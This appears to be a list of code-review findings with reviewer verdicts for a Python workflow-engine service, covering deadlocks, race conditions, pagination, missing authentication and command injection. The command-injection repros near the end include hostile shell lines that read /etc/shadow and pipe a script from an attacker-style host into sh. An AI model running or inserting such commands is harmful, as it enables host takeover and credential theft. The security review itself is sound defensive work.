correctness.title: Checkpoint copies TaskNode rows but leaves previous_node_ids/next_node_ids pointing to old workflow's UUIDs
correctness.description: _check_and_checkpoint creates a new workflow with copied TaskNode rows that have new UUIDs, but previous_node_ids and next_node_ids are copied as-is. They still reference the old workflow's UUIDs. The new workflow's _get_ready_nodes treats these as dangling references and never marks dependent nodes as ready. The new workflow deadlocks; raises RuntimeError('...deadlocked after 30 seconds') after 30s.
correctness.repro: Workflow A with [step1 (uuid-a1), step2 (uuid-a2, deps=[uuid-a1])]. Checkpoint triggers; new workflow B is created. New nodes: step1 (uuid-b1), step2 (uuid-b2, deps=[uuid-a1]). step2.previous_node_ids=[uuid-a1] but B doesn't have uuid-a1. _get_ready_nodes checks node_status.get('uuid-a1') -> None. all_deps_completed=False. step2 is never ready. Workflow B deadlocks.
correctness.proposedFix: Build an old_id -> new_id map and rewrite the adjacency lists: id_map = {old_node.id: uuid.uuid4() for old_node in old_nodes}. For each new TaskNode, set previous_node_ids=[id_map[uuid.UUID(p)] for p in old.previous_node_ids if uuid.UUID(p) in id_map] and similarly for next_node_ids.

verdict.reason: The bug is real and accurately described. Lines 884-903 of engine.py create new TaskNode rows (each with a fresh UUID via the column's default=uuid.uuid4) but copy previous_node_ids and next_node_ids verbatim from the old nodes. _get_ready_nodes (line 549) builds node_status only from the new workflow's nodes, so any dep ID from the old workflow returns None in the lookup, making all_deps_completed permanently False. The new workflow then triggers the 30-second deadlock RuntimeError at line 372. The proposed id_map-based fix is correct and complete (minor nit: id_map[uuid.UUID(p)] should be id_map[p] since previous_node_ids is list[str], but the conceptual fix is right). Severity is appropriate: any multi-node workflow hitting the checkpoint threshold will deadlock.

correctness.title: Inconsistent cycle_count reporting on early returns in OPA loop
correctness.description: max_cycles_exceeded returns cycle_count-1 (cycles completed), but token_budget_exceeded at line 409 returns cycle_count (attempts entered). Both should use the same convention. With max_cycles=5, the loop checks cycle_count>5 on iteration 6 and reports 5, but the same iteration's token check would report 6. Downstream metrics and dashboards are unreliable.
correctness.repro: Set MAX_OPA_CYCLES=5, MAX_LLM_TOKENS=100. Run a workflow that uses 100 heuristic tokens on cycle 1. The token_budget_exceeded path returns cycle_count=1 (a cycle never completed), while max_cycles_exceeded would have returned 0. The WorkflowResult.cycle_count metric is inconsistent across termination paths.
correctness.proposedFix: Decrement cycle_count before any early-return that did not complete a full cycle. Standardize all four return sites (lines 394, 406, 428, 449) to use the same expression. Pick a single convention (e.g. 'cycles completed') and document it on WorkflowResult.

verdict.reason: The bug is real. Inspection of opa_loop.py confirms the four early-return sites use inconsistent conventions: line 394 (max_cycles_exceeded) returns cycle_count - 1, line 406 (token_budget_exceeded) returns cycle_count, line 428 (agent_unreachable on observation) returns cycle_count - 1 with comment "no cycle completed", line 449 (agent_unreachable on list_tools) returns cycle_count - 1, and line 468 (planner_timeout_no_progress) returns cycle_count. The repro's example (cycle 1 hits the token budget, returns cycle_count=1) is realistic and reproduces the inconsistency. However, the repro's claim that max_cycles_exceeded would return 0 in the same scenario is wrong — that path would never return 0 since cycle_count only increments. The proposed fix is correct in spirit (standardize on one convention), and 3 of 5 paths already use cycle_count - 1, making that the natural choice.

correctness.title: DELETE /api/workflows/{id} cancels but does not delete; pre-check order wrong
correctness.description: Handler declared as DELETE only sets status to CANCELLED and returns 200 with WorkflowResponse. The running_tasks dict entry is removed BEFORE the workflow existence check, so a DELETE on a non-existent UUID silently deletes (no-op) the running_tasks entry if one happens to exist. Returns 200 (should be 202/204 for cancel; should be 200 with body deletion semantics if it's a true DELETE).
correctness.repro: DELETE /api/workflows/<unknown-uuid> on a server that has a running task for that UUID: returns 404 (since check happens), but the running_tasks entry was already mutated. Concurrent DELETE + new POST /execute of the same id can race the dict.
correctness.proposedFix: Either rename to POST /api/workflows/{id}/cancel (status 202, no body), or implement true DELETE (delete row, return 204). Reorder: existence check FIRST, then cancel asyncio.Task, then update DB status, in a single transaction.

verdict.reason: The bug is real. Line 748 declares the route as DELETE but only sets status to CANCELLED (line 780), so the verb doesn't match semantics. More critically, lines 761-763 mutate `app.state.running_tasks` (call `.cancel()` and `del`) BEFORE the DB existence check at lines 765-771. If the workflow does not exist (or the DB transaction fails), the endpoint raises HTTPException(404), but the running_tasks entry has already been removed — that's a real state mutation on the error path. The race claim is also valid: a concurrent POST /api/workflows could insert a new entry into running_tasks between the dict-mutation and the DB check. The repro is somewhat contrived (an unknown UUID with a running_tasks entry requires out-of-band state), but the underlying ordering bug and REST-semantics bug are genuine. The proposed fix is sound: reorder to check existence first, then cancel task, then update DB; or rename to POST /cancel which better matches REST and avoids the DELETE-vs-cancel ambiguity.

correctness.title: since_id cursor uses random UUID ordering, not temporal ordering
correctness.description: Handlers do TaskEvent.id > since_uuid and order by timestamp ASC. UUIDv4 is random, so id > since_uuid is not monotonic in time. A polling client can miss events whose UUID sorts lower than the last seen id, and fetch rows out of temporal order. WorkflowEvent has a monotonic sequence_number column but uses the same broken pattern.
correctness.repro: Fetch events 1..N, take the last id as since_id; events arriving in the same millisecond with smaller UUIDs are missed; events with larger UUIDs but earlier timestamps are returned out of order.
correctness.proposedFix: For WorkflowEvent, expose sequence_number as the cursor. For TaskEvent, switch to a composite cursor (timestamp, id) with WHERE (ts, id) > (since_ts, since_id), or add a monotonic BIGSERIAL seq column to task_events.

verdict.reason: Verified bug. Both endpoints use `id > since_uuid` as a cursor where `id` is a UUIDv4 (random, no temporal ordering). TaskEvent has `sequence_number` nullable but unused; WorkflowEvent has a monotonic `sequence_number` column that engine.py uses internally but the API endpoint ignores in favor of the random UUID. Polling clients will miss events with UUIDs that sort lower than `since_id` and will receive events out of temporal order because the ORDER BY is timestamp but the filter is random UUID. Severity medium is appropriate: data loss for polling clients but not catastrophic.

correctness.title: Event queries have no tiebreaker on timestamp; order is non-deterministic
correctness.description: Event queries order by timestamp ASC only. Two events with the same timestamp can swap order between requests. Combined with #11, pages are non-deterministic.
correctness.repro: Insert 100 events in the same millisecond; paginate with since_id; observe the order shifts between requests.
correctness.proposedFix: Add ORDER BY timestamp ASC, id ASC and a (>=) composite cursor.

verdict.reason: The code at line 425 has `order_by(TaskEvent.timestamp.asc())` with no secondary sort key. The `id` column is UUID4 (random), so two events with identical timestamps have no defined order. The cursor `TaskEvent.id > since_uuid` (line 443) advances correctly but does not preserve order. The repro is realistic - inserting 100 events in the same millisecond is feasible (datetime.now() has microsecond precision, and tight loops can collide). The proposed fix `ORDER BY timestamp ASC, id ASC` is correct and would make ordering stable. Severity "low" is appropriate because pagination remains complete (no events lost) - only intra-batch ordering can shift between requests, which is cosmetic for an event log.

persistence.title: Workflow status not persisted on max-cycles / token-budget escalation
persistence.description: _update_workflow_status(workflow_id, WorkflowStatus.RUNNING) is called when the loop bails out, but there is no ESCALATED or CANCELLED status in WorkflowStatus (models.py 54-62). The workflow stays in RUNNING in the DB even though WorkflowResult.status='escalated'. External systems polling for terminal states will see RUNNING forever.
persistence.repro: Start a workflow with MAX_OPA_CYCLES=1 and a long-running goal. Cycle 1 completes but cycle 2 hits max_cycles. The loop returns WorkflowResult(status='escalated') but the workflow row remains in RUNNING. A dashboard querying workflows WHERE status IN (COMPLETED, FAILED, PAUSED, CANCELLED) will never include this escalated workflow.
persistence.proposedFix: Add ESCALATED to WorkflowStatus (or reuse CANCELLED) and persist it. Emit a final WORKFLOW_COMPLETED (with reason) or new ESCALATED WorkflowEvent before returning.

verdict.reason: Confirmed bug. WorkflowStatus enum at database/models.py:54-62 has no ESCALATED value (only PENDING/RUNNING/PAUSED/COMPLETED/FAILED/CANCELLED), yet opa_loop.py:393, 405, and 467 explicitly call _update_workflow_status(workflow_id, WorkflowStatus.RUNNING) right before returning a WorkflowResult with status="escalated". The workflow row stays in RUNNING in the DB while the in-memory WorkflowResult reports escalated. Repro is realistic — any dashboard filtering on terminal states will miss these workflows. Proposed fix is correct: add ESCALATED to the enum (preferred over reusing CANCELLED, since escalation is semantically distinct from user-cancellation) and persist it before returning.

transactional-boundary.title: Side effects commit before durable completion marker, enabling double-execution on replay
transactional-boundary.description: _execute_node runs the workspace (lines 488-501), commits the workspace's side effects to the real world, then opens a new session to mark the node COMPLETED. If the process crashes between the workspace completing and the COMPLETED commit, the event log shows RUNNING+no terminal event, so replay resets to PENDING and the node runs again. Any non-idempotent side effect (DB insert, file write) is duplicated.
transactional-boundary.repro: Node A writes a row to an external Postgres DB. workspace.execute finishes, output captured. Process crashes before session.commit() on the COMPLETED branch. Engine restarts, replay sees RUNNING+no NODE_COMPLETED, resets to PENDING. Workflow runs again, Node A writes the row again (duplicate). No compensation triggered because Node A was never marked COMPLETED.
transactional-boundary.proposedFix: Commit the success/failure TaskEvent and node status BEFORE tearing down the workspace. Use the transactional outbox pattern: write the event to the DB inside the workspace lifecycle, and have the workspace teardown wait for the commit. Or persist a checkpoint (e.g. node.outputs) to the DB before the workspace is torn down.

verdict.reason: The bug is real. Lines 488-501 execute the workspace (committing side effects to the real world), and the completion event/status is recorded in a separate session at line 527. If the process crashes between workspace completion and the session commit on line 527, the node status remains RUNNING with no NODE_COMPLETED event, and the replay logic at lines 663-671 explicitly resets such nodes to PENDING. This causes the node to be re-executed on the next run, duplicating any non-idempotent side effects. The proposed fix (transactional outbox / persisting outputs to the DB before workspace teardown) is a correct and complete remediation for this classic at-least-once delivery problem.

time-handling.title: Evaluator cache TTL uses wall-clock time.time() which is NTP-jump sensitive
time-handling.description: _get_cached compares time.time() against entry.expires_at. If the system clock jumps backward (NTP correction), entries with expires_at in the 'past' are correctly expired, but entries with expires_at in the 'future' of the new clock can persist longer than intended. Conversely, a forward jump causes premature expiration.
time-handling.repro: Process starts at time.time()=1000.0, EVALUATOR_CACHE_TTL_SECONDS=60. Cache entry expires_at=1060.0. NTP correction sets wall clock to 900.0. time.time() > entry.expires_at -> 900.0 > 1060.0 -> False -> cache never expires, but the entry is now logically 'from 100 seconds in the future' so it persists.
time-handling.proposedFix: Replace time.time() with time.monotonic() in _get_cached and _set_cached. monotonic() is immune to wall-clock jumps.

verdict.reason: Code at line 137 uses time.time() for TTL comparison and line 146 for setting expires_at. Both are wall-clock based and vulnerable to NTP step adjustments. The repro is logically correct (clock jumps from 1000.0 to 900.0 means 900.0 > 1060.0 is False, so the entry persists). The proposed fix (time.monotonic()) is appropriate for an in-memory process-local cache, since monotonic()'s undefined epoch is irrelevant when the cache doesn't survive process boundaries. However, severity "low" is appropriate because NTP steps are typically smoothed/small, the cache is process-local (restart clears it), and the consequence is only a slightly stale LLM-driven heuristic decision.

race-condition.title: execute_workflow: existence check + task spawn race; no idempotency / no status guard
race-condition.description: Verify-workflow-exists happens in a session that is closed before engine.run_workflow is called. A concurrent DELETE/cancel can mark the workflow CANCELLED or remove it between the check and the dispatch. There is no status guard — calling /execute on a workflow already in RUNNING/COMPLETED/FAILED spawns a duplicate background task; the new task silently overwrites the prior entry in app.state.running_tasks. Engine may not guard against double-execution either.
race-condition.repro: Two concurrent POST /api/workflows/{id}/execute on the same workflow: both 200 OK, only one task in the dict, the other is unreferenced and may be GC'd or run detached. POST /execute on a COMPLETED workflow re-runs it.
race-condition.proposedFix: (a) Re-verify Workflow.status inside the same transaction that begins execution; require status==PENDING else 409 Conflict. (b) Hold a per-workflow asyncio.Lock (or DB SELECT...FOR UPDATE) so duplicate /execute calls are rejected. (c) engine.run_workflow should accept the session and re-check under that session, OR a unique constraint on (workflow_id, status='running') should be enforced.

verdict.reason: The bug is real. The existence check at app.py:295-301 uses a session that is closed before line 337 dispatches engine.run_workflow, and it only checks `wf is None` — no status guard. Two concurrent POSTs on the same workflow_id will both pass the check, both spawn asyncio tasks, and the second silently overwrites the first in app.state.running_tasks (line 339). Both tasks then proceed into Engine.run_workflow, which at line 323-330 unconditionally sets `workflow.status = WorkflowStatus.RUNNING` with no precondition check, leading to concurrent double-execution of the same workflow's nodes. The repro's claim that the orphaned task "may be GC'd" is incorrect (asyncio keeps a strong ref to created tasks and `running_tasks` is overwritten, not deleted — so both tasks actually run), but the underlying consequence (duplicate execution) is real and arguably worse than described: it can cause nodes to be scheduled twice, double-emit events, and trigger double side-effects/compensations. The repro "POST /execute on a COMPLETED workflow re-runs it" is also accurate — there is no check preventing this. Proposed fix is directionally correct (status guard + per-workflow lock) but incomplete: it does not address the engine-level lack of a guard at line 323-330 (e.g., SELECT...FOR UPDATE or a `WHERE status == PENDING` precondition update). Severity of "critical" is appropriate — duplicate execution is a serious correctness bug for an event-sourced workflow engine.

race-condition.title: WorkflowEvent sequence_number is not protected against concurrent insert collisions
race-condition.description: _run_node_under_semaphore reads the last WorkflowEvent's sequence_number, computes next_seq, and inserts. Two concurrent _run_node_under_semaphore coroutines on the same workflow both read the same last_event, both compute N+1, and both insert. No UNIQUE constraint and no FOR UPDATE. Sequence numbers are no longer monotonic, breaking replay ordering.
race-condition.repro: Workflow has 4 ready nodes at once. Two _run_node_under_semaphore coroutines run concurrently. Both query for the last WorkflowEvent; both get the same row. Both compute N+1 and insert. Now two events with sequence_number=N+1 exist. A later replay ordered by sequence_number has non-deterministic order for events at the same seq.
race-condition.proposedFix: Add a UNIQUE constraint on WorkflowEvent(workflow_id, sequence_number). Catch IntegrityError and retry with a fresh sequence number. Or use a per-workflow counter row with SELECT ... FOR UPDATE.

verdict.reason: The bug is real. At engine.py:412-428 and the parallel block at 436-452, _run_node_under_semaphore reads max(sequence_number) and inserts +1 without any per-workflow locking, FOR UPDATE, or UNIQUE constraint on (workflow_id, sequence_number). With MAX_PARALLEL_SUBPROCESSES=4 (default in config/settings.py:35), asyncio.gather schedules multiple coroutines that each open an independent session via get_session() — concurrent reads of the same last_event and concurrent inserts of the same N+1 are physically possible. The WorkflowEvent model (database/models.py:329-331) declares only an index on (workflow_id, event_type); no UNIQUE constraint. The proposed fix (UNIQUE constraint + retry on IntegrityError, or SELECT FOR UPDATE) is correct in direction but incomplete: identical races exist in opa_loop.py:749-758 (max-seq read for resume emissions) and checkpoint.py:147-152 (count-based seq = (count)+1, which is even more collision-prone under concurrency). A correct fix needs to either cover all three sites or extract a single atomic helper. Severity 'high' is reasonable: collisions silently corrupt sequence_number monotonicity used by FeatureDetector queries at evaluation/detector.py:49,154,206 (.order_by(sequence_number.asc())). Practical blast radius is moderate rather than catastrophic because the consumers are aggregate analytics rather than hard ordering dependencies.

resource-leak.title: OpenAIClient.close is a no-op, leaking httpx connections
resource-leak.description: async def close(self) -> None: with an empty body. The AsyncOpenAI client owns an httpx.AsyncClient connection pool. Not calling await self._client.close() leaks connections; __aexit__ (base.py 161) calls close() which is a no-op.
resource-leak.repro: async with OpenAIClient(settings) as client: ... exit the block. __aexit__ runs close() (no-op). Process exits; httpx emits ResourceWarning about unclosed client. Under load, the OS file descriptor table fills up.
resource-leak.proposedFix: Add 'await self._client.close()' to the body of close().

verdict.reason: The bug is real. OpenAIClient.close() in /Users/tom/src/agentic-dynamic-workflows/src/celeste/core/llm/openai.py:117 has an empty body. The AsyncOpenAI instance (self._client) does own an httpx connection pool that requires explicit closing. The OpenAI SDK documentation confirms clients should be explicitly closed via .close() or context manager to prevent resource leaks. The base class __aexit__ calls this no-op close(), defeating the purpose of the async context manager pattern. Sister implementations in anthropic.py (line 126) and ollama.py (line 79) correctly call `await self._client.aclose()`, confirming this is the intended pattern. The repro is realistic: in long-running async services that create/destroy LLM clients per-request, the connection pool would not be released, leading to file descriptor exhaustion. The proposed fix `await self._client.close()` is correct. Note: gemini.py has the same bug, suggesting a copy-paste oversight rather than intentional design.

performance.title: Count queries load all rows into memory (OOM / O(N) on every list call)
performance.description: total = len(total_result.scalars().all()) materializes every workflow row just to count them. Same anti-pattern at line 557 (cycle_count = len(cycle_result.scalars().all())) and line 563-564 (loads every TaskNode to count statuses). Linear in table size on every list call.
performance.repro: Insert 100k workflows, then GET /api/workflows?limit=10 — DB returns 100k rows just to compute total. Bandwidth and memory scale with the entire table.
performance.proposedFix: Use select(func.count()).select_from(Workflow) with the same WHERE filters. For node counts, use select(TaskNode.status, func.count()).group_by(TaskNode.status) or accept approximate counts from a SQL aggregate.

verdict.reason: Verified the code: line 215 declares `count_stmt = select(Workflow)` (a full SELECT, not a count), and line 221 does `total = len(total_result.scalars().all())` which materializes every matching row just to take a length. Same anti-pattern at line 557 (`cycle_count = len(cycle_result.scalars().all())`) and lines 563-564 (loads every TaskNode to count statuses). The proposed fix using `select(func.count()).select_from(Workflow)` is the standard SQLAlchemy pattern and is correct. However, severity should be tempered: the page query itself is bounded by the `limit` param (max 100), and the per-workflow counts (557, 563-564) are scoped to a single workflow_id so they are bounded by nodes/events per workflow, not the whole table. The unbounded one is only line 215/221's total count, which is a genuine O(N) per list call.

pagination.title: get_global_events pagination is unstable across two merged sources
pagination.description: Two queries each fetch limit+offset rows ordered DESC, merged and sorted in Python. No total is computable. Rows with identical timestamp can shift between pages because the sort key lacks a stable tiebreaker. offset-based pagination across two sources produces duplicates/missed rows on adjacent pages.
pagination.repro: GET /api/events?offset=10&limit=10 — when two events share a timestamp, page 1 and page 2 may both contain one or both, depending on insertion order.
pagination.proposedFix: Use a single UNION ALL (or two queries with row_number() OVER()) to produce a single ordered stream. Add (timestamp, id) as the sort key. Replace offset with a cursor (since_id + since_ts) and remove offset.

verdict.reason: The bug is real and accurately described. Lines 653-667 fetch `limit + offset` rows from two separate tables, both ordered by timestamp DESC. The merge sorts on timestamp alone with `combined.sort(key=lambda x: x[0], reverse=True)` (line 699) - no tiebreaker on id. Python's sort is stable, but the input order depends on the two independent SQL queries, which don't have a coordinated ordering. When two events share a timestamp (common in transactional systems that emit task+workflow events together), adjacent pages can duplicate or miss rows. Offset-based pagination across two sources is the root problem. The proposed fix (composite (timestamp, id) key + cursor pagination, or UNION ALL) is the correct standard remedy. No total is computable as claimed. The "high" severity is slightly inflated for a monitoring feed (medium would also be defensible), but the bug itself is genuine.

request-size-limits.title: No request body size limit; CreateWorkflowRequest.nodes has no max_length
request-size-limits.description: No RequestSizeLimit middleware, no Starlette max_request_size config. CreateWorkflowRequest.nodes only has min_length=1 with no max_length, and DAGNodeInput has no max_length on name/command/arguments. One POST can submit millions of nodes with multi-MB arguments, all persisted as JSON in a single transaction. Combined with #3, an attacker can OOM the server.
request-size-limits.repro: POST /api/workflows with nodes array of 100k entries each with 100KB arguments dict — server accepts and persists; subsequent GET /api/workflows/{id} (#19) returns a multi-GB response.
request-size-limits.proposedFix: Add app.add_middleware(RequestSizeLimitMiddleware, max_size=1_048_576) (1 MiB) or pass client_max_body_size at the ASGI server level. Add max_length constraints: nodes: list[DAGNodeInput] = Field(min_length=1, max_length=1000), name: str = Field(max_length=255), command: str = Field(max_length=8192). Reject arguments dicts over a size threshold in a validator.

verdict.reason: Verified directly in code: /Users/tom/src/agentic-dynamic-workflows/src/celeste/api/schemas.py line 29 has `nodes: list[DAGNodeInput] = Field(min_length=1)` with no max_length; DAGNodeInput (lines 12-21) has unbounded str fields and an unbounded arguments dict. /Users/tom/src/agentic-dynamic-workflows/src/celeste/api/app.py confirms no RequestSizeLimitMiddleware is registered (only CORSMiddleware at line 122), and Dockerfile line 26 launches uvicorn with no --limit-max-requests or similar. A grep across the repo for `client_max_body_size|max_request_size|RequestSizeLimit|max_body` returned zero matches. Repro is realistic: POST /api/workflows accepts arbitrarily large JSON, persists it, and GET /api/workflows/{id} (app.py line 273) returns the full dag_definition. This is a genuine DoS vector against an unauthenticated endpoint, not documented intentional behavior.

auth-authz.title: No authentication or authorization on any endpoint
auth-authz.description: All endpoints are unauthenticated. Anyone with network access can submit workflows (which spawn workspaces and execute commands), register remote agents, cancel running workflows, and read all workflow data, events, and in-memory secrets. No API key check, no JWT verification, no rate limiting.
auth-authz.repro: curl -X POST http://server/api/workflows -d '{...}' works without any auth header. No 401, no audit log, no rate limit.
auth-authz.proposedFix: Add a Depends(verify_api_key) (or HTTPBearer with env-configured token) to every non-/health endpoint. For multi-tenant, add Workflow.tenant_id and scope reads/writes to the caller. Add a slowapi or token-bucket rate limiter.

verdict.reason: Confirmed by direct inspection: src/celeste/api/app.py contains zero authentication/authorization code. No Depends(), HTTPBearer, APIKeyHeader, JWT verification, API-key check, or auth middleware anywhere in the file. All endpoints (POST /api/workflows, GET /api/workflows/*, DELETE /api/workflows/{id}, POST /agents/register, etc.) accept requests with no auth header and return data or execute actions unconditionally. CORS middleware is configured but provides no authentication. The repro is realistic — a curl POST to /api/workflows would succeed without any auth. The "in-memory secrets" claim is slightly loose (no literal secrets are exposed; only llm_tokens_accumulated metrics and agent auth_token registration input), but the core claim of full unauthenticated access to workflow submission, agent registration, cancellation, and read of all workflow/event data is accurate. The proposed fix (HTTPBearer/Depends verify_api_key on non-/health endpoints) is correct and standard; audit logging would also be needed but is a secondary concern. Severity is warranted because endpoints trigger workspace spawning and command execution without any access control.

observability.title: Workflow task exception is logged but no TaskEvent records the cause
observability.description: The done-callback catches engine.run_workflow's exception and tries to mark the workflow FAILED, but no TaskEvent/WorkflowEvent is written. The exception class and message exist only in the ERROR log. A debugging user has no audit trail of why the workflow crashed. Also: if the engine already committed a different terminal status, the callback's session re-reads and may overwrite it.
observability.repro: Cause engine.run_workflow to raise a non-recoverable error. The workflow row ends up FAILED with no recorded event explaining the cause; the /events endpoint shows nothing.
observability.proposedFix: Inside the callback (or the async wrapper from #7), open a single transaction that (a) inserts a TaskEvent of type WORKFLOW_FAILED (or a new ENGINE_ERROR type) with exc.__class__.__name__ and str(exc) in event_data, (b) updates the workflow status, (c) commits. Use SELECT...FOR UPDATE on the workflow row to avoid the overwrite race.

verdict.reason: Verified the claim. The done-callback at /Users/tom/src/agentic-dynamic-workflows/src/celeste/api/app.py:304-322 catches exceptions from engine.run_workflow() and only logs them and updates status; no TaskEvent/WorkflowEvent row is written. The /Users/tom/src/agentic-dynamic-workflows/src/celeste/database/models.py:65-95 TaskEventType enum has no WORKFLOW_FAILED type. The deadlock RuntimeError at engine.py:371 propagates unhandled, triggering exactly this path with no event. The overwrite race is also real since _mark_workflow_failed does a plain SELECT then UPDATE. The fix direction is correct, though emitting the event from inside run_workflow's except clause (next to the existing _fail_workflow call) would be more consistent with the engine's own _fail_workflow/_complete_workflow pattern.

error-responses.title: submit_workflow failures bubble to generic 500; no global exception handler
error-responses.description: If engine.submit_workflow(plan) raises (DB constraint violation, OOM during JSON serialize, integrity error from #14), FastAPI's default 500 handler returns 'Internal Server Error' with no correlation id. The ErrorResponse schema is defined but never wired in.
error-responses.repro: Insert a DB constraint that rejects Workflow.name > 255 chars and POST a workflow with a 1024-char name — response is a generic 500 with no detail.
error-responses.proposedFix: Register @app.exception_handler(Exception) that logs request id + workflow name + stack trace and returns {"detail": "internal_error", "request_id": "..."}. Add a request-id middleware. Catch the specific engine exceptions and map to 400/409 with descriptive messages.

verdict.reason: The bug is real. At /Users/tom/src/agentic-dynamic-workflows/src/celeste/api/app.py:172, `await engine.submit_workflow(plan)` is unguarded — no try/except and no global `@app.exception_handler(Exception)` is registered anywhere in the file (verified by grep). The `ErrorResponse` schema is imported (line 53) but never referenced in any handler. The repro is realistic: Workflow.name is `String(255)` (database/models.py:126), so a 1024-char name would trigger an IntegrityError that would bubble up as a generic FastAPI 500 "Internal Server Error" with no detail or correlation ID. memory-leak.title: app.state.running_tasks grows without bound; no cleanup on success
memory-leak.description: Tasks are added on execute but only removed on cancel or on the exception path. A task that completes successfully leaves its entry in the dict forever. The dict grows without bound for the lifetime of the process. Additionally, del app.state.running_tasks[str(wf_uuid)] happens before the cancellation is observed; the engine may still be writing rows after the entry is gone.
memory-leak.repro: Execute 1000 workflows to completion, observe len(app.state.running_tasks) == 1000. Memory grows monotonically.
memory-leak.proposedFix: In _on_task_done (or the async wrapper from #7), always do app.state.running_tasks.pop(str(wf_uuid), None) after logging. Or use a weakref set keyed on the task. Add a test that asserts the dict is empty after workflows complete.

verdict.reason: Verified by reading /Users/tom/src/agentic-dynamic-workflows/src/celeste/api/app.py lines 304-339 and 753-763. _on_task_done (lines 304-322) is registered as the done callback at line 338, but it only handles the exception/cancelled paths and never calls running_tasks.pop(). The dict is only cleaned up in cancel_workflow (line 763). Successful completions leak the (UUID -> asyncio.Task) entry for the lifetime of the process. The repro (1000 workflows -> 1000 entries) is realistic for a long-running server. The proposed fix to pop in _on_task_done is correct and complete. The secondary claim about cancel race (del happens before engine observes cancellation) is also real but tangential.

command-injection.title: Command injection via asyncio.create_subprocess_shell in workspace executor
command-injection.description: _stream_subprocess_events uses asyncio.create_subprocess_shell with the raw `command` string. Any unescaped shell metacharacter (;, &&, |, $(), backticks, redirection, etc.) is interpreted by /bin/sh. The agent.call_tool path concatenates `command` and `args` (agent.py:363) before running the security auditor against `command_str`, then passes only `command` to the workspace - so metacharacters in either component run unfiltered even when the audit verdict is 'safe'. STRICT_SECURITY_MODE=True provides no real protection here.
command-injection.repro: Submit a workflow with node {command: 'curl http://x; cat /etc/shadow', arguments: {}} via POST /api/workflows. The deterministic audit may pass or fail on 'curl' but the workspace executes `await asyncio.create_subprocess_shell('curl http://x; cat /etc/shadow', cwd=...)` which goes through /bin/sh, running cat.
command-injection.proposedFix: Replace create_subprocess_shell with create_subprocess_exec and require command + args to be a structured argv list (already supported by ShellDriver.run_command in driver.py:124). Plumb the `arguments` dict through the workspace executor instead of relying on string concatenation. Also wire the SecurityAuditor into LocalTmpWorkspace.execute and GitWorktreeWorkspace.execute so the full command (with args) is audited before the process starts.

verdict.reason: The bug is genuine. _stream_subprocess_events in base.py:44 uses asyncio.create_subprocess_shell with a raw command string, so shell metacharacters (;, &&, |, $(), backticks) are interpreted by /bin/sh. The engine path (engine.py:492) calls workspace.execute(node.command, node.arguments) which forwards the command string only — arguments are dropped, not plumbed. The SecurityAuditor is only wired into the agent's call_tool path (agent.py:360-369) for tool name "run_command"; nothing audits commands executed through workspace.execute. STRICT_SECURITY_MODE is defined in settings.py:91 but is never read anywhere — it's a dead flag that gives the appearance of protection. The repro is realistic: a node with command "curl http://x; cat /etc/shadow" and arguments={} would, via the engine path, hit create_subprocess_shell("curl http://x; cat /etc/shadow") and run cat /etc/shadow with no audit gating. The proposed fix (use create_subprocess_exec with structured argv) is correct and the right shape; additionally wiring SecurityAuditor into LocalTmpWorkspace.execute/GitWorktreeWorkspace.execute is the appropriate second step. Severity is correctly rated critical.

command-injection.title: DockerWorkspace.execute spawns python -c with shell=True inside the container, evaluating the command string
command-injection.description: DockerWorkspace.execute (docker.py:112-118) builds an `inner_python` string that calls `subprocess.run(cmd, shell=True, ...)` where cmd is the LLM-controlled `command` field from the tool call. Although wrapped in a container, the command string still flows through python's shell parser inside the container. Combined with SEC-001 this means the container sandbox is bypassed for any code-injection patterns, and the same shell metacharacter issue applies inside the container.
command-injection.repro: Run DockerWorkspace with command='echo hi; apt-get install -y curl && curl http://evil/x.sh | sh'. The container-side python -c call will execute the apt + curl pipeline with shell=True.
command-injection.proposedFix: Pass command and arguments as separate JSON fields to the container-side python script, then call subprocess.run with a list (shell=False). Reject any command containing shell metacharacters at the audit layer. The container's isolation is the safety net, not the shell interpreter.

verdict.reason: Technically accurate: line 116 does call subprocess.run(cmd, shell=True) with cmd being the LLM-controlled 'command' field, so shell metacharacters in the command would be parsed by the in-container /bin/sh. The repro is realistic. However, this is the intended behavior of a 'workspace' abstraction whose entire purpose is to grant shell execution inside a container sandbox — the security boundary is the container itself, not the Python script. The arguments dict is accepted but ignored, which is a minor design wart. The proposed fix (list form + metachar rejection) is reasonable defense-in-depth but contradicts the workspace's shell-execution contract. Severity should be downgraded: this is a known design tradeoff, not a hidden injection sink.

command-injection.title: Command injection in compensation path: Engine._handle_failure calls comp_workspace.execute(comp_cmd, comp_args) without audit
command-injection.description: Engine._handle_failure iterates completed nodes with compensation_command, then calls `await comp_workspace.execute(comp_cmd, comp_args)` (engine.py:729) without any SecurityAuditor check or ToolRegistry allowlist. An attacker who can persist a malicious DAGPlan (via POST /api/workflows) can plant a `compensation_command` that runs arbitrary shell when triggered by a downstream failure. Because compensation runs in the default workspace engine (local_tmp), it executes on the host via create_subprocess_shell.
command-injection.repro: Submit workflow with two nodes: A (succeeds, compensation_command='curl http://evil/x.sh|sh') and B (fails with task_type 'tool_execution'). Triggering failure on B causes engine._handle_failure to execute A's compensation_command verbatim, leading to RCE on the host.

verdict.reason: Engine._handle_failure at line 729 calls comp_workspace.execute(comp_cmd, comp_args) with no SecurityAuditor check. The DAGNodeInput schema (schemas.py:20) accepts compensation_command as an unvalidated string, and submit_workflow (engine.py:170) persists it without any allowlist or audit. The workspace base class (workspaces/base.py:44) executes via asyncio.create_subprocess_shell on the host, so any author of a DAGPlan can plant a command that runs on failure-trigger. The repro is realistic: POST a workflow with a node whose compensation_command is a shell payload, then cause a downstream node to fail, and Engine._handle_failure will run the planted command verbatim. Note also that the same gap exists for the normal node.command path (engine.py:492), but the reported claim is correctly scoped to compensation. The proposed fix is incomplete because the Engine class has no _security_auditor attribute (only OPALoop does) - the fix needs to (a) thread SecurityAuditor into Engine, (b) apply audit_command to both node.command at execute time and comp_cmd at compensation time, and (c) actually block on verdict (check_deterministic alone is a subset - non-deterministic matches return None).

audit-coverage.title: SecurityAuditor not wired into legacy Engine._execute_node or compensation path
audit-coverage.description: Engine._execute_node (legacy path used by /api/workflows/{id}/execute) reads node.command and node.arguments directly from the DB and passes them to workspace.execute without any SecurityAuditor invocation or ToolRegistry allowlist check. Likewise, opa_loop._trigger_compensation (opa_loop.py:1080-1084) routes through agent.call_tool (which does audit), but the legacy _handle_failure path in engine.py:723-735 calls comp_workspace.execute(comp_cmd, comp_args) with no audit at all. Any workflow submitted via the legacy /execute endpoint bypasses the auditor entirely.
